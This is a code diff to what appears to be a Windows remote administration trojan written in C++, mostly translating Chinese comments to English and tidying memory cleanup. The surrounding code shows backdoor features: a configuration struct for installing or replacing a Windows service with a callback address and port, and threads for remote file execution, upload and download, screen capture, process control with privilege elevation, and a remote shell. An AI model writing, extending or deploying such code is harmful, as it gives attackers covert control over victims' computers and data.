@@ -15,13 +15,13 @@
 
 struct MODIFY_DATA
 {
-	char  strIPFile[128];   //ip文件or DNS						0
-	char  strVersion[16];   //服务端版本							128
+	char  strIPFile[128];   //ip file or DNS					0
+	char  strVersion[16];   //server version					128
 	DWORD dwVipID;          //VIP ID							144
-	BOOL  bReplace;         //TRUE-替换服务，FALSE-新建服务		148
-	char  strSvrName[32];   //服务名称							149
-	char  strSvrDisp[100];  //服务显示							181
-	char  strSvrDesc[100];  //服务描述							281
+	BOOL  bReplace;         //TRUE-replcae，FALSE-create new		148
+	char  strSvrName[32];   //name								149
+	char  strSvrDisp[100];  //Display name						181
+	char  strSvrDesc[100];  //describe							281
 	char  ServerAddr[100];	//Client Addr						381
 	int   ServerPort;		//Client port						481
 } modify_data =
@@ -360,8 +360,7 @@ DWORD _stdcall FileManageThread(LPVOID lParam)
 	msgHead.dwSize = 0;
 	if (!SendMsg(FileSocket, chBuffer, &msgHead))
 	{
-		if (chBuffer != NULL)
-			delete[]chBuffer;
+		delete[] chBuffer;
 
 		closesocket(FileSocket);
 		return 0;//send socket type error
@@ -369,14 +368,12 @@ DWORD _stdcall FileManageThread(LPVOID lParam)
 
 	while (true)
 	{
-		//接收命令
 		if (!RecvMsg(FileSocket, chBuffer, &msgHead))
 			break;
 
-		//解析命令
 		switch (msgHead.dwCmd)
 		{
-		case CMD_FILEDRIVER://获取驱动器
+		case CMD_FILEDRIVER:
 		{
 			FileListDirver(chBuffer, &msgHead);
 		}
@@ -391,22 +388,22 @@ DWORD _stdcall FileManageThread(LPVOID lParam)
 			FileDelete(chBuffer, &msgHead);
 		}
 		break;
-		case CMD_FILEEXEC://执行
+		case CMD_FILEEXEC:
 		{
 			FileExec(chBuffer, &msgHead);
 		}
 		break;
-		case CMD_FILEPASTE://粘贴
+		case CMD_FILEPASTE:
 		{
 			FilePaste(chBuffer, &msgHead);
 		}
 		break;
-		case CMD_FILERENAME://重命名
+		case CMD_FILERENAME:
 		{
 			FileReName(chBuffer, &msgHead);
 		}
 		break;
-		case CMD_FILEDOWNSTART://下载开始
+		case CMD_FILEDOWNSTART:
 		{
 			FileOpt m_FileOpt;
 			memcpy(&m_FileOpt, chBuffer, sizeof(m_FileOpt));
@@ -418,7 +415,7 @@ DWORD _stdcall FileManageThread(LPVOID lParam)
 			msgHead.dwSize = 0;
 		}
 		break;
-		case CMD_FILEUPSTART://上传开始
+		case CMD_FILEUPSTART:
 		{
 			FileOpt m_FileOpt;
 			memcpy(&m_FileOpt, chBuffer, sizeof(m_FileOpt));
@@ -442,8 +439,7 @@ DWORD _stdcall FileManageThread(LPVOID lParam)
 			break;
 	}
 
-	if (chBuffer != NULL)
-		delete[] chBuffer;
+	delete[] chBuffer;
 
 	shutdown(FileSocket, 0);
 	closesocket(FileSocket);
@@ -488,7 +484,7 @@ DWORD _stdcall ScreenThread(LPVOID lParam)
 	////////////////////////////////////////
 	XScreenXor m_ScreenXor;
 
-	m_ScreenXor.SetColor(nColor); //设置位图颜色
+	m_ScreenXor.SetColor(nColor);
 	m_ScreenXor.InitGlobalVar();
 
 	ScreenRadio = m_ScreenXor.Radio; //Radio info for MouseMove Msg
@@ -511,7 +507,7 @@ DWORD _stdcall ScreenThread(LPVOID lParam)
 	BYTE* pDataCompress = new BYTE[lenthCompress];
 
 	lenthCompress = compressBound(lenthUncompress); //(unsigned long)((lenthUncompress+12)*1.1);
-	m_ScreenXor.CaputreFrameFirst(0);                                        //抓取当前帧
+	m_ScreenXor.CaputreFrameFirst(0);
 	Sleep(15);
 	compress(pDataCompress, &lenthCompress, m_ScreenXor.GetBmpData(), lenthUncompress);
 
@@ -665,12 +661,12 @@ DWORD _stdcall ProcessThread(LPVOID lParam)
 
 	GrantPrivilege();
 
-	while (true)	//接收命令
+	while (true)
 	{
 		if (!RecvMsg(ProcessSocket, chBuffer, &msgHead))
 			break;
 
-		switch (msgHead.dwCmd)	//解析命令
+		switch (msgHead.dwCmd)
 		{
 		case CMD_PROCESSLIST:
 		{
@@ -690,7 +686,7 @@ DWORD _stdcall ProcessThread(LPVOID lParam)
 		break;
 		}
 
-		if (!SendMsg(ProcessSocket, chBuffer, &msgHead))	//发送数据
+		if (!SendMsg(ProcessSocket, chBuffer, &msgHead))
 			break;
 	}
 
@@ -739,8 +735,7 @@ DWORD _stdcall ShellThread(LPVOID lParam)
 			break;
 	}
 
-	if (chBuffer != NULL)
-		delete[] chBuffer;
+	delete[] chBuffer;
 
 	shutdown(ShellSocket, 0);
 	closesocket(ShellSocket);
@@ -818,7 +813,7 @@ DWORD _stdcall FileUpThread(LPVOID lParam)
 		return 0;
 	}
 
-	int iOutTime = 60000;//60秒超时
+	int iOutTime = 60000;
 	setsockopt(FileSocket, SOL_SOCKET, SO_RCVTIMEO, (char*)&iOutTime, sizeof(int));
 
 	MsgHead msgHead;
@@ -845,8 +840,10 @@ DWORD _stdcall FileUpThread(LPVOID lParam)
 	//send file message
 	if (send(FileSocket, (char *)&m_FileOpt, sizeof(FileOpt), 0) <= 0 || dwUpFileSize <= 0)
 	{
+		CloseHandle(hUpFile);
 		shutdown(FileSocket, 0x02);
 		closesocket(FileSocket);
+
 		return 1;//send socket type error
 	}
 
